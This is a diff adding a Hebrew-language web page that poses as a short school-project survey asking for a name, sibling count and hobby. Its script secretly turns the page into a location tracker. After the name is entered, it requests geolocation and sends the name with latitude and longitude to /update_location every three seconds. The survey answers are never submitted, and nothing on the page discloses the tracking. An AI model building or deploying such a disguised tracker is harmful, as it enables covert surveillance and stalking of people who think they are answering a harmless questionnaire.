@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="he">
+
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>סקר קצר</title>
+
+<style>
+
+body{
+font-family:Arial;
+background:#111827;
+color:white;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+margin:0;
+}
+
+.card{
+background:#1f2937;
+padding:30px;
+border-radius:20px;
+width:320px;
+text-align:center;
+}
+
+input{
+width:100%;
+padding:10px;
+border-radius:10px;
+border:none;
+margin-top:10px;
+margin-bottom:15px;
+}
+
+button{
+width:100%;
+padding:12px;
+border:none;
+border-radius:10px;
+background:#2563eb;
+color:white;
+font-weight:bold;
+cursor:pointer;
+}
+
+.hidden{
+display:none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="card">
+
+<div id="step1">
+
+<h2>שאלון קצר</h2>
+
+<input id="nameInput" placeholder="הכנס שם">
+
+<button onclick="start()">המשך</button>
+
+</div>
+
+<div id="step2" class="hidden">
+
+<h2>סקר קצר</h2>
+
+<label>כמה אחים יש לך?</label>
+<input type="number">
+
+<label>תחביב עיקרי</label>
+<input>
+
+<button onclick="finish()">שלח</button>
+
+</div>
+
+<div id="step3" class="hidden">
+
+<h2>תודה!</h2>
+
+<p>תודה רבה על שיתוף הפעולה עם<br>
+<b>פרוייקט הגמר של אוראל שורק</b></p>
+
+</div>
+
+</div>
+
+<script>
+
+let username=""
+
+function start(){
+
+username=document.getElementById("nameInput").value
+
+if(!username){
+alert("נא להכניס שם")
+return
+}
+
+navigator.geolocation.getCurrentPosition(
+
+(pos)=>{
+
+sendLocation(pos.coords.latitude,pos.coords.longitude)
+
+document.getElementById("step1").classList.add("hidden")
+document.getElementById("step2").classList.remove("hidden")
+
+startTracking()
+
+}
+
+)
+
+}
+
+function startTracking(){
+
+setInterval(()=>{
+
+navigator.geolocation.getCurrentPosition(
+
+(pos)=>{
+
+sendLocation(pos.coords.latitude,pos.coords.longitude)
+
+}
+
+)
+
+},3000)
+
+}
+
+function sendLocation(lat,lon){
+
+fetch("/update_location",{
+
+method:"POST",
+
+headers:{
+"Content-Type":"application/json"
+},
+
+body:JSON.stringify({
+username:username,
+lat:lat,
+lon:lon
+})
+
+})
+
+}
+
+function finish(){
+
+document.getElementById("step2").classList.add("hidden")
+document.getElementById("step3").classList.remove("hidden")
+
+}
+
+</script>
+
+</body>
+
+</html>
